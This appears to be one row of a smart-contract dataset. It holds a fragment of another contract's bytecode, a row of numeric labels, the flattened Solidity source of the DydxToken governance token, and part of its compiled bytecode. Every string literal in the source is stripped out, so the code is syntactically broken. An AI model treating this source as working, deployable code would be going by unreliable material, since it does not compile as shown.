5060405180910390fd5b6120dd82600083612188565b61211a816040518060600160405280602281526020016122d3602291396001600160a01b0385166000908152602081905260409020549190611ff5565b6001600160a01b038316600090815260208190526040902055600254612140908261218d565b6002556040805182815290516000916001600160a01b038516917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360200190a35050565b505050565b6000828211156121e4576040805162461bcd60e51b815260206004820152601e60248201527f536166654d6174683a207375627472616374696f6e206f766572666c6f770000604482015290519081900360640190fd5b50900390565b828054600181600116156101000203166002900490600052602060002090601f0160209004810192826122205760008555612266565b82601f106122395782800160ff19823516178555612266565b82800160010185558215612266579182015b8281111561226657823582559160200191906001019061224b565b50612272929150612276565b5090565b5b80821115612272576000815560010161227756fe45524332303a207472616e7366657220746f20746865207a65726f20616464726573734f46543a20696e76616c696420736f757263652073656e64696e6720636f6e747261637445524332303a206275726e20616d6f756e7420657863656564732062616c616e63654f776e61626c653a206e6577206f776e657220697320746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63654f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657245524332303a206275726e2066726f6d20746865207a65726f20616464726573734f46543a2073656e64546f6b656e7328292069732063757272656e746c792070617573656445524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa2646970667358221220509d27a33b1ccd8dd921bcc7a92729316f3003f949c729e2ab4e10e8351279f364736f6c63430007060033,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity 0.7.5;abstract contract Context { function _msgSender() internal view virtual returns (address payable) { return msg.sender; } function _msgData() internal view virtual returns (bytes memory) { this; return msg.data; }}pragma solidity 0.7.5;interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}pragma solidity 0.7.5;library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { return mod(a, b, ); } function mod( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; }}pragma solidity 0.7.5;library Address { function isContract(address account) internal view returns (bool) { bytes32 codehash; bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470; assembly { codehash := extcodehash(account) } return (codehash != accountHash && codehash != 0x0); } function sendValue(address payable recipient, uint256 amount) internal { require(address(this).balance >= amount, ); (bool success, ) = recipient.call{value: amount}(); require(success, ); }}pragma solidity ^0.7.5;contract ERC20 is Context, IERC20 { using SafeMath for uint256; using Address for address; mapping (address => uint256) private _balances; mapping (address => mapping (address => uint256)) private _allowances; uint256 private _totalSupply; string internal _name; string internal _symbol; uint8 private _decimals; constructor (string memory name, string memory symbol) public { _name = name; _symbol = symbol; _decimals = 18; } function name() virtual public view returns (string memory) { return _name; } function symbol() virtual public view returns (string memory) { return _symbol; } function decimals() virtual public view returns (uint8) { return _decimals; } function totalSupply() public view override returns (uint256) { return _totalSupply; } function balanceOf(address account) public view override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public virtual override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public virtual override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, )); return true; } function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue)); return true; } function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, )); return true; } function _transfer(address sender, address recipient, uint256 amount) internal virtual { require(sender != address(0), ); require(recipient != address(0), ); _beforeTokenTransfer(sender, recipient, amount); _balances[sender] = _balances[sender].sub(amount, ); _balances[recipient] = _balances[recipient].add(amount); emit Transfer(sender, recipient, amount); } function _mint(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(address(0), account, amount); _totalSupply = _totalSupply.add(amount); _balances[account] = _balances[account].add(amount); emit Transfer(address(0), account, amount); } function _burn(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(account, address(0), amount); _balances[account] = _balances[account].sub(amount, ); _totalSupply = _totalSupply.sub(amount); emit Transfer(account, address(0), amount); } function _approve(address owner, address spender, uint256 amount) internal virtual { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _setupDecimals(uint8 decimals_) internal { _decimals = decimals_; } function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }}pragma solidity 0.7.5;contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor() { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; }}pragma solidity 0.7.5;interface IGovernancePowerDelegationERC20 { enum DelegationType { VOTING_POWER, PROPOSITION_POWER } event DelegateChanged( address indexed delegator, address indexed delegatee, DelegationType delegationType ); event DelegatedPowerChanged(address indexed user, uint256 amount, DelegationType delegationType); function delegateByType(address delegatee, DelegationType delegationType) external virtual; function delegate(address delegatee) external virtual; function getDelegateeByType(address delegator, DelegationType delegationType) external view virtual returns (address); function getPowerCurrent(address user, DelegationType delegationType) external view virtual returns (uint256); function getPowerAtBlock( address user, uint256 blockNumber, DelegationType delegationType ) external view virtual returns (uint256);}pragma solidity 0.7.5;abstract contract GovernancePowerDelegationERC20Mixin is ERC20, IGovernancePowerDelegationERC20{ using SafeMath for uint256; bytes32 public constant DELEGATE_BY_TYPE_TYPEHASH = keccak256( ); bytes32 public constant DELEGATE_TYPEHASH = keccak256( ); struct Snapshot { uint128 blockNumber; uint128 value; } function delegateByType( address delegatee, DelegationType delegationType ) external override { _delegateByType(msg.sender, delegatee, delegationType); } function delegate( address delegatee ) external override { _delegateByType(msg.sender, delegatee, DelegationType.VOTING_POWER); _delegateByType(msg.sender, delegatee, DelegationType.PROPOSITION_POWER); } function getDelegateeByType( address delegator, DelegationType delegationType ) external override view returns (address) { (, , mapping(address => address) storage delegates) = _getDelegationDataByType(delegationType); return _getDelegatee(delegator, delegates); } function getPowerCurrent( address user, DelegationType delegationType ) external override view returns (uint256) { ( mapping(address => mapping(uint256 => Snapshot)) storage snapshots, mapping(address => uint256) storage snapshotsCounts, ) = _getDelegationDataByType(delegationType); return _searchByBlockNumber(snapshots, snapshotsCounts, user, block.number); } function getPowerAtBlock( address user, uint256 blockNumber, DelegationType delegationType ) external override view returns (uint256) { ( mapping(address => mapping(uint256 => Snapshot)) storage snapshots, mapping(address => uint256) storage snapshotsCounts, ) = _getDelegationDataByType(delegationType); return _searchByBlockNumber(snapshots, snapshotsCounts, user, blockNumber); } function _delegateByType( address delegator, address delegatee, DelegationType delegationType ) internal { require( delegatee != address(0), ); (, , mapping(address => address) storage delegates) = _getDelegationDataByType(delegationType); uint256 delegatorBalance = balanceOf(delegator); address previousDelegatee = _getDelegatee(delegator, delegates); delegates[delegator] = delegatee; _moveDelegatesByType(previousDelegatee, delegatee, delegatorBalance, delegationType); emit DelegateChanged(delegator, delegatee, delegationType); } function _moveDelegatesByType( address from, address to, uint256 amount, DelegationType delegationType ) internal { if (from == to) { return; } ( mapping(address => mapping(uint256 => Snapshot)) storage snapshots, mapping(address => uint256) storage snapshotsCounts, ) = _getDelegationDataByType(delegationType); if (from != address(0)) { uint256 previous = 0; uint256 fromSnapshotsCount = snapshotsCounts[from]; if (fromSnapshotsCount != 0) { previous = snapshots[from][fromSnapshotsCount - 1].value; } else { previous = balanceOf(from); } uint256 newAmount = previous.sub(amount); _writeSnapshot( snapshots, snapshotsCounts, from, uint128(newAmount) ); emit DelegatedPowerChanged(from, newAmount, delegationType); } if (to != address(0)) { uint256 previous = 0; uint256 toSnapshotsCount = snapshotsCounts[to]; if (toSnapshotsCount != 0) { previous = snapshots[to][toSnapshotsCount - 1].value; } else { previous = balanceOf(to); } uint256 newAmount = previous.add(amount); _writeSnapshot( snapshots, snapshotsCounts, to, uint128(newAmount) ); emit DelegatedPowerChanged(to, newAmount, delegationType); } } function _searchByBlockNumber( mapping(address => mapping(uint256 => Snapshot)) storage snapshots, mapping(address => uint256) storage snapshotsCounts, address user, uint256 blockNumber ) internal view returns (uint256) { require( blockNumber <= block.number, ); uint256 snapshotsCount = snapshotsCounts[user]; if (snapshotsCount == 0) { return balanceOf(user); } if (snapshots[user][snapshotsCount - 1].blockNumber <= blockNumber) { return snapshots[user][snapshotsCount - 1].value; } if (snapshots[user][0].blockNumber > blockNumber) { return 0; } uint256 lower = 0; uint256 upper = snapshotsCount - 1; while (upper > lower) { uint256 center = upper - (upper - lower) / 2; Snapshot memory snapshot = snapshots[user][center]; if (snapshot.blockNumber == blockNumber) { return snapshot.value; } else if (snapshot.blockNumber < blockNumber) { lower = center; } else { upper = center - 1; } } return snapshots[user][lower].value; } function _getDelegationDataByType( DelegationType delegationType ) internal virtual view returns ( mapping(address => mapping(uint256 => Snapshot)) storage, mapping(address => uint256) storage, mapping(address => address) storage ); function _writeSnapshot( mapping(address => mapping(uint256 => Snapshot)) storage snapshots, mapping(address => uint256) storage snapshotsCounts, address owner, uint128 newValue ) internal { uint128 currentBlock = uint128(block.number); uint256 ownerSnapshotsCount = snapshotsCounts[owner]; mapping(uint256 => Snapshot) storage ownerSnapshots = snapshots[owner]; if ( ownerSnapshotsCount != 0 && ownerSnapshots[ownerSnapshotsCount - 1].blockNumber == currentBlock ) { ownerSnapshots[ownerSnapshotsCount - 1].value = newValue; } else { ownerSnapshots[ownerSnapshotsCount] = Snapshot(currentBlock, newValue); snapshotsCounts[owner] = ownerSnapshotsCount + 1; } } function _getDelegatee( address delegator, mapping(address => address) storage delegates ) internal view returns (address) { address previousDelegatee = delegates[delegator]; if (previousDelegatee == address(0)) { return delegator; } return previousDelegatee; }}pragma solidity 0.7.5;contract DydxToken is GovernancePowerDelegationERC20Mixin, Ownable{ using SafeMath for uint256; event TransferAllowlistUpdated( address account, bool isAllowed ); event TransfersRestrictedBeforeUpdated( uint256 transfersRestrictedBefore ); string internal constant NAME = ; string internal constant SYMBOL = ; uint256 public constant INITIAL_SUPPLY = 1_000_000_000 ether; bytes32 public immutable DOMAIN_SEPARATOR; bytes public constant EIP712_VERSION = ; bytes32 public constant EIP712_DOMAIN = keccak256( ); bytes32 public constant PERMIT_TYPEHASH = keccak256( ); uint256 public constant MINT_MIN_INTERVAL = 365 days; uint256 public immutable MINT_MAX_PERCENT; uint256 public immutable TRANSFER_RESTRICTION_LIFTED_NO_LATER_THAN; mapping(address => uint256) internal _nonces; mapping(address => mapping(uint256 => Snapshot)) public _votingSnapshots; mapping(address => uint256) public _votingSnapshotsCounts; mapping(address => address) public _votingDelegates; mapping(address => mapping(uint256 => Snapshot)) public _propositionPowerSnapshots; mapping(address => uint256) public _propositionPowerSnapshotsCounts; mapping(address => address) public _propositionPowerDelegates; mapping(uint256 => Snapshot) public _totalSupplySnapshots; uint256 public _totalSupplySnapshotsCount; mapping(address => bool) public _tokenTransferAllowlist; uint256 public _mintingRestrictedBefore; uint256 public _transfersRestrictedBefore; constructor( address distributor, uint256 transfersRestrictedBefore, uint256 transferRestrictionLiftedNoLaterThan, uint256 mintingRestrictedBefore, uint256 mintMaxPercent ) ERC20(NAME, SYMBOL) { uint256 chainId; assembly { chainId := chainid() } DOMAIN_SEPARATOR = keccak256( abi.encode( EIP712_DOMAIN, keccak256(bytes(NAME)), keccak256(bytes(EIP712_VERSION)), chainId, address(this) ) ); require( transfersRestrictedBefore > block.timestamp, ); require( transfersRestrictedBefore <= transferRestrictionLiftedNoLaterThan, ); require( mintingRestrictedBefore > block.timestamp, ); _transfersRestrictedBefore = transfersRestrictedBefore; TRANSFER_RESTRICTION_LIFTED_NO_LATER_THAN = transferRestrictionLiftedNoLaterThan; _mintingRestrictedBefore = mintingRestrictedBefore; MINT_MAX_PERCENT = mintMaxPercent; _mint(distributor, INITIAL_SUPPLY); emit TransfersRestrictedBeforeUpdated(transfersRestrictedBefore); } function addToTokenTransferAllowlist( address[] calldata addressesToAdd ) external onlyOwner { for (uint256 i = 0; i < addressesToAdd.length; i++) { require( !_tokenTransferAllowlist[addressesToAdd[i]], ); _tokenTransferAllowlist[addressesToAdd[i]] = true; emit TransferAllowlistUpdated(addressesToAdd[i], true); } } function removeFromTokenTransferAllowlist( address[] calldata addressesToRemove ) external onlyOwner { for (uint256 i = 0; i < addressesToRemove.length; i++) { require( _tokenTransferAllowlist[addressesToRemove[i]], ); _tokenTransferAllowlist[addressesToRemove[i]] = false; emit TransferAllowlistUpdated(addressesToRemove[i], false); } } function updateTransfersRestrictedBefore( uint256 transfersRestrictedBefore ) external onlyOwner { uint256 previousTransfersRestrictedBefore = _transfersRestrictedBefore; require( block.timestamp < previousTransfersRestrictedBefore, ); require( previousTransfersRestrictedBefore <= transfersRestrictedBefore, ); require( transfersRestrictedBefore <= TRANSFER_RESTRICTION_LIFTED_NO_LATER_THAN, ); _transfersRestrictedBefore = transfersRestrictedBefore; emit TransfersRestrictedBeforeUpdated(transfersRestrictedBefore); } function mint( address recipient, uint256 amount ) external onlyOwner { require( block.timestamp >= _mintingRestrictedBefore, ); require( amount <= totalSupply().mul(MINT_MAX_PERCENT).div(100), ); _mintingRestrictedBefore = block.timestamp.add(MINT_MIN_INTERVAL); _mint(recipient, amount); } function permit( address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s ) external { require( owner != address(0), ); require( block.timestamp <= deadline, ); uint256 currentValidNonce = _nonces[owner]; bytes32 digest = keccak256( abi.encodePacked( , DOMAIN_SEPARATOR, keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, currentValidNonce, deadline)) ) ); require( owner == ecrecover(digest, v, r, s), ); _nonces[owner] = currentValidNonce.add(1); _approve(owner, spender, value); } function nonces( address owner ) external view returns (uint256) { return _nonces[owner]; } function transfer( address recipient, uint256 amount ) public override returns (bool) { _requireTransferAllowed(_msgSender(), recipient); return super.transfer(recipient, amount); } function transferFrom( address sender, address recipient, uint256 amount ) public override returns (bool) { _requireTransferAllowed(sender, recipient); return super.transferFrom(sender, recipient, amount); } function _mint( address account, uint256 amount ) internal override { super._mint(account, amount); uint256 snapshotsCount = _totalSupplySnapshotsCount; uint128 currentBlock = uint128(block.number); uint128 newValue = uint128(totalSupply()); _totalSupplySnapshots[snapshotsCount] = Snapshot(currentBlock, newValue); _totalSupplySnapshotsCount = snapshotsCount.add(1); } function _requireTransferAllowed( address sender, address recipient ) view internal { if ( block.timestamp < TRANSFER_RESTRICTION_LIFTED_NO_LATER_THAN && block.timestamp < _transfersRestrictedBefore ) { require( _tokenTransferAllowlist[sender] || _tokenTransferAllowlist[recipient], ); } } function _beforeTokenTransfer( address from, address to, uint256 amount ) internal override { address votingFromDelegatee = _getDelegatee(from, _votingDelegates); address votingToDelegatee = _getDelegatee(to, _votingDelegates); _moveDelegatesByType( votingFromDelegatee, votingToDelegatee, amount, DelegationType.VOTING_POWER ); address propPowerFromDelegatee = _getDelegatee(from, _propositionPowerDelegates); address propPowerToDelegatee = _getDelegatee(to, _propositionPowerDelegates); _moveDelegatesByType( propPowerFromDelegatee, propPowerToDelegatee, amount, DelegationType.PROPOSITION_POWER ); } function _getDelegationDataByType( DelegationType delegationType ) internal override view returns ( mapping(address => mapping(uint256 => Snapshot)) storage, mapping(address => uint256) storage, mapping(address => address) storage ) { if (delegationType == DelegationType.VOTING_POWER) { return (_votingSnapshots, _votingSnapshotsCounts, _votingDelegates); } else { return ( _propositionPowerSnapshots, _propositionPowerSnapshotsCounts, _propositionPowerDelegates ); } } function delegateByTypeBySig( address delegatee, DelegationType delegationType, uint256 nonce, uint256 expiry, uint8 v, bytes32 r, bytes32 s ) public { bytes32 structHash = keccak256( abi.encode(DELEGATE_BY_TYPE_TYPEHASH, delegatee, uint256(delegationType), nonce, expiry) ); bytes32 digest = keccak256(abi.encodePacked(, DOMAIN_SEPARATOR, structHash)); address signer = ecrecover(digest, v, r, s); require( signer != address(0), ); require( nonce == _nonces[signer]++, ); require( block.timestamp <= expiry, ); _delegateByType(signer, delegatee, delegationType); } function delegateBySig( address delegatee, uint256 nonce, uint256 expiry, uint8 v, bytes32 r, bytes32 s ) public { bytes32 structHash = keccak256(abi.encode(DELEGATE_TYPEHASH, delegatee, nonce, expiry)); bytes32 digest = keccak256(abi.encodePacked(, DOMAIN_SEPARATOR, structHash)); address signer = ecrecover(digest, v, r, s); require( signer != address(0), ); require( nonce == _nonces[signer]++, ); require( block.timestamp <= expiry, ); _delegateByType(signer, delegatee, DelegationType.VOTING_POWER); _delegateByType(signer, delegatee, DelegationType.PROPOSITION_POWER); }}",0x608060405234801561001057600080fd5b50600436106102a05760003560e01c8063715018a611610167578063c2ffbb91116100ce578063dd62ed3e11610087578063dd62ed3e14610913578063e1b11da414610941578063eccec5a814610949578063f0eb7f8e14610951578063f2fde38b14610977578063f713d8a81461099d576102a0565b8063c2ffbb9114610807578063c3cda5201461083c578063cdfeb0c114610883578063d17deb9f1461088b578063d505accf14610893578063dc937e1c146108e4576102a0565b806395d89b411161012057806395d89b4114610753578063a457c2d71461075b578063a9059cbb14610787578063aa9fbe02146107b3578063ad36dafd146107bb578063b2f4201d146107d8576102a0565b8063715018a6146106175780637bb73c971461061f5780637ecebe00146106455780638aaee2341461066b5780638d48f4f1146106db5780638da5cb5b1461074b576102a0565b806340c10f191161020b5780635c19a95c116101c45780635c19a95c146105605780635f3b687614610586578063657c7a85146105b257806369e3b0d0146105ba5780636f50458d146105c257806370a08231146105f1576102a0565b806340c10f191461047057806341cbf54a1461049e57806348032ec1146104a6578063537f215c146104cc578063549aa8a31461050e5780635b3cc0cf14610534576102a0565b80632b4e1a5b1161025d5780632b4e1a5b146104065780632ff2e9dc1461040e57806330adf81f14610416578063313ce5671461041e5780633644e5151461043c5780633950935114610444576102a0565b806306fdde03146102a5578063095ea7b31461032257806313929bbe1461036257806318160ddd146103ae5780631ff06fdf146103c857806323b872dd146103d0575b600080fd5b6102ad6109ee565b6040805160208082528351818301528351919283929083019185019080838360005b838110156102e75781810151838201526020016102cf565b50505050905090810190601f1680156103145780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61034e6004803603604081101561033857600080fd5b506001600160a01b038135169060200135610a84565b604080519115158252519081900360200190f35b61037f6004803603602081101561037857600080fd5b5035610aa2565b60405180836001600160801b03168152602001826001600160801b031681526020019250505060405180910390f35b6103b6610ac8565b60408051918252519081900360200190f35b6103b6610ace565b61034e600480360360608110156103e657600080fd5b506001600160a01b03813581169160208101359091169060400135610ad4565b6103b6610af3565b6103b6610af9565b6103b6610b09565b610426610b2d565b6040805160ff9092168252519081900360200190f35b6103b6610b36565b61034e6004803603604081101561045a57600080fd5b506001600160a01b038135169060200135610b5a565b61049c6004803603604081101561048657600080fd5b506001600160a01b038135169060200135610bad565b005b6103b6610cf6565b61034e600480360360208110156104bc57600080fd5b50356001600160a01b0316610d1a565b6104f2600480360360208110156104e257600080fd5b50356001600160a01b0316610d2f565b604080516001600160a01b039092168252519081900360200190f35b6103b66004803603602081101561052457600080fd5b50356001600160a01b0316610d4a565b61037f6004803603604081101561054a57600080fd5b506001600160a01b038135169060200135610d5c565b61049c6004803603602081101561057657600080fd5b50356001600160a01b0316610d8d565b61037f6004803603604081101561059c57600080fd5b506001600160a01b038135169060200135610da8565b6103b6610dd9565b6103b6610dfd565b6104f2600480360360408110156105d857600080fd5b5080356001600160a01b0316906020013560ff16610e05565b6103b66004803603602081101561060757600080fd5b50356001600160a01b0316610e1f565b61049c610e3a565b6103b66004803603602081101561063557600080fd5b50356001600160a01b0316610ee7565b6103b66004803603602081101561065b57600080fd5b50356001600160a01b0316610ef9565b61049c6004803603602081101561068157600080fd5b81019060208101813564010000000081111561069c57600080fd5b8201836020820111156106ae57600080fd5b803590602001918460208302840111640100000000831117156106d057600080fd5b509092509050610f14565b61049c600480360360208110156106f157600080fd5b81019060208101813564010000000081111561070c57600080fd5b82018360208201111561071e57600080fd5b8035906020019184602083028401116401000000008311171561074057600080fd5b5090925090506110ba565b6104f261125a565b6102ad61126e565b61034e6004803603604081101561077157600080fd5b506001600160a01b0381351690602001356112cf565b61034e6004803603604081101561079d57600080fd5b506001600160a01b038135169060200135611337565b6103b661135b565b61049c600480360360208110156107d157600080fd5b503561137f565b6103b6600480360360408110156107ee57600080fd5b5080356001600160a01b0316906020013560ff16611523565b6103b66004803603606081101561081d57600080fd5b5080356001600160a01b0316906020810135906040013560ff1661154b565b61049c600480360360c081101561085257600080fd5b506001600160a01b038135169060208101359060408101359060ff6060820135169060808101359060a00135611574565b6103b66117b4565b6103b66117ba565b61049c600480360360e08110156108a957600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c001356117de565b61049c600480360360408110156108fa57600080fd5b5080356001600160a01b0316906020013560ff16611a34565b6103b66004803603604081101561092957600080fd5b506001600160a01b0381358116916020013516611a3f565b6103b6611a6a565b6102ad611a8e565b6104f26004803603602081101561096757600080fd5b50356001600160a01b0316611aab565b61049c6004803603602081101561098d57600080fd5b50356001600160a01b0316611ac6565b61049c600480360360e08110156109b357600080fd5b506001600160a01b038135169060ff602082013581169160408101359160608201359160808101359091169060a08101359060c00135611bcf565b60038054604080516020601f6002600019610100600188161502019095169490940493840181900481028201810190925282815260609390929091830182828015610a7a5780601f10610a4f57610100808354040283529160200191610a7a565b820191906000526020600020905b815481529060010190602001808311610a5d57829003601f168201915b5050505050905090565b6000610a98610a91611fac565b8484611fb0565b5060015b92915050565b600d602052600090815260409020546001600160801b0380821691600160801b90041682565b60025490565b60115481565b6000610ae0848461209c565b610aeb848484612161565b949350505050565b600e5481565b6b033b2e3c9fd0803ce800000081565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b60055460ff1690565b7f17e76dd75f3dfe3e50d31322433cc1405e898404a5724da2d4804cab81e0a88a81565b6000610a98610b67611fac565b84610ba88560016000610b78611fac565b6001600160a01b03908116825260208083019390935260409182016000908120918c168152925290205490611f10565b611fb0565b610bb5611fac565b60055461010090046001600160a01b03908116911614610c0a576040805162461bcd60e51b81526020600482018190526024820152600080516020612d54833981519152604482015290519081900360640190fd5b601054421015610c52576040805162461bcd60e51b815260206004820152600e60248201526d4d494e545f544f4f5f4541524c5960901b604482015290519081900360640190fd5b610c8f6064610c897f0000000000000000000000000000000000000000000000000000000000000002610c83610ac8565b906121e3565b9061223c565b811115610cd7576040805162461bcd60e51b815260206004820152601160248201527013505617d352539517d15610d151511151607a1b604482015290519081900360640190fd5b610ce5426301e13380611f10565b601055610cf2828261227e565b5050565b7f9a9a49b990ba9bb39f8048c490a40ab25c18f55d208d5fbcf958261a9b48716d81565b600f6020526000908152604090205460ff1681565b6009602052600090815260409020546001600160a01b031681565b600b6020526000908152604090205481565b60076020908152600092835260408084209091529082529020546001600160801b0380821691600160801b90041682565b610d9933826000612304565b610da533826001612304565b50565b600a6020908152600092835260408084209091529082529020546001600160801b0380821691600160801b90041682565b7f000000000000000000000000000000000000000000000000000000000000000281565b6301e1338081565b600080610e1183612415565b92505050610aeb848261244f565b6001600160a01b031660009081526020819052604090205490565b610e42611fac565b60055461010090046001600160a01b03908116911614610e97576040805162461bcd60e51b81526020600482018190526024820152600080516020612d54833981519152604482015290519081900360640190fd5b60055460405160009161010090046001600160a01b0316907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a360058054610100600160a81b0319169055565b60086020526000908152604090205481565b6001600160a01b031660009081526006602052604090205490565b610f1c611fac565b60055461010090046001600160a01b03908116911614610f71576040805162461bcd60e51b81526020600482018190526024820152600080516020612d54833981519152604482015290519081900360640190fd5b60005b818110156110b557600f6000848484818110610f8c57fe5b602090810292909201356001600160a01b03168352508101919091526040016000205460ff1615610fee5760405162461bcd60e51b8152600401808060200182810382526024815260200180612d996024913960400191505060405180910390fd5b6001600f600085858581811061100057fe5b905060200201356001600160a01b03166001600160a01b03166001600160a01b0316815260200190815260200160002060006101000a81548160ff0219169083151502179055507f80e7b8bab7ab72e47957c0c472ede1b89bb3e7d2ba30cd37c2d6b000b49a960a83838381811061107457fe5b905060200201356001600160a01b0316600160405180836001600160a01b0316815260200182151581526020019250505060405180910390a1600101610f74565b505050565b6110c2611fac565b60055461010090046001600160a01b03908116911614611117576040805162461bcd60e51b81526020600482018190526024820152600080516020612d54833981519152604482015290519081900360640190fd5b60005b818110156110b557600f600084848481811061113257fe5b602090810292909201356001600160a01b03168352508101919091526040016000205460ff166111935760405162461bcd60e51b815260040180806020018281038252602c815260200180612de1602c913960400191505060405180910390fd5b6000600f60008585858181106111a557fe5b905060200201356001600160a01b03166001600160a01b03166001600160a01b0316815260200190815260200160002060006101000a81548160ff0219169083151502179055507f80e7b8bab7ab72e47957c0c472ede1b89bb3e7d2ba30cd37c2d6b000b49a960a83838381811061121957fe5b905060200201356001600160a01b0316600060405180836001600160a01b0316815260200182151581526020019250505060405180910390a160010161111a565b60055461010090046001600160a01b031690565b60048054604080516020601f6002600019610100600188161502019095169490940493840181900481028201810190925282815260609390929091830182828015610a7a5780601f10610a4f57610100808354040283529160200191610a7a565b6000610a986112dc611fac565b84610ba885604051806060016040528060258152602001612e2f6025913960016000611306611fac565b6001600160a01b03908116825260208083019390935260409182016000908120918d1681529252902054919061247a565b600061134a611344611fac565b8461209c565b6113548383612511565b9392505050565b7f10d8d059343739efce7dad10d09f0806da52b252b3e6a7951920d2d6ec4102e581565b611387611fac565b60055461010090046001600160a01b039081169116146113dc576040805162461bcd60e51b81526020600482018190526024820152600080516020612d54833981519152604482015290519081900360640190fd5b601154428111611433576040805162461bcd60e51b815260206004820152601a60248201527f5452414e534645525f5245535452494354494f4e5f454e444544000000000000604482015290519081900360640190fd5b818111156114725760405162461bcd60e51b8152600401808060200182810382526022815260200180612e0d6022913960400191505060405180910390fd5b7f000000000000000000000000000000000000000000000000000000006145fef08211156114e7576040805162461bcd60e51b815260206004820152601e60248201527f41465445525f4d41585f5452414e534645525f5245535452494354494f4e0000604482015290519081900360640190fd5b60118290556040805183815290517fd7b9c9321b627ff004969698b4616502d6b7305a588e685489e91c46fca509a99181900360200190a15050565b600080600061153184612415565b509150915061154282828743612525565b95945050505050565b600080600061155984612415565b509150915061156a82828888612525565b9695505050505050565b604080517f9a9a49b990ba9bb39f8048c490a40ab25c18f55d208d5fbcf958261a9b48716d6020808301919091526001600160a01b038916828401526060820188905260808083018890528351808403909101815260a08301845280519082012061190160f01b60c08401527f17e76dd75f3dfe3e50d31322433cc1405e898404a5724da2d4804cab81e0a88a60c284015260e2808401829052845180850390910181526101028401808652815191840191909120600091829052610122850180875281905260ff891661014286015261016285018890526101828501879052945191949390926001926101a280840193601f198301929081900390910190855afa158015611687573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b0381166116e3576040805162461bcd60e51b8152602060048201526011602482015270494e56414c49445f5349474e415455524560781b604482015290519081900360640190fd5b6001600160a01b03811660009081526006602052604090208054600181019091558814611747576040805162461bcd60e51b815260206004820152600d60248201526c494e56414c49445f4e4f4e434560981b604482015290519081900360640190fd5b86421115611791576040805162461bcd60e51b815260206004820152601260248201527124a72b20a624a22fa2ac2824a920aa24a7a760711b604482015290519081900360640190fd5b61179d818a6000612304565b6117a9818a6001612304565b505050505050505050565b60105481565b7f000000000000000000000000000000000000000000000000000000006145fef081565b6001600160a01b038716611829576040805162461bcd60e51b815260206004820152600d60248201526c24a72b20a624a22fa7aba722a960991b604482015290519081900360640190fd5b83421115611873576040805162461bcd60e51b815260206004820152601260248201527124a72b20a624a22fa2ac2824a920aa24a7a760711b604482015290519081900360640190fd5b6001600160a01b0380881660008181526006602090815260408083205481517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98185015280830195909552948b166060850152608084018a905260a0840185905260c08085018a90528151808603909101815260e08501825280519083012061190160f01b6101008601527f17e76dd75f3dfe3e50d31322433cc1405e898404a5724da2d4804cab81e0a88a61010286015261012280860191909152815180860390910181